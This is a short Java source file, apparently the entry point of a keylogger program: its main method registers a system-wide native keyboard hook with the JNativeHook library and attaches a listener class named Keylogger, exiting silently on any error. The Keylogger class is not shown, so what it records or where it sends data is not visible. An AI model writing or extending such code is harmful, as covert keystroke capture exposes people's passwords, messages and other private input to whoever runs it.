package com.mibef108287.app;

import com.github.kwhat.jnativehook.GlobalScreen;

public class App 
{
    public static void main( String[] args )
    {
        try {
            Keylogger keylogger = new Keylogger();
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(keylogger);
        } catch (Exception e) {
            System.exit(1);
        }
    }
}
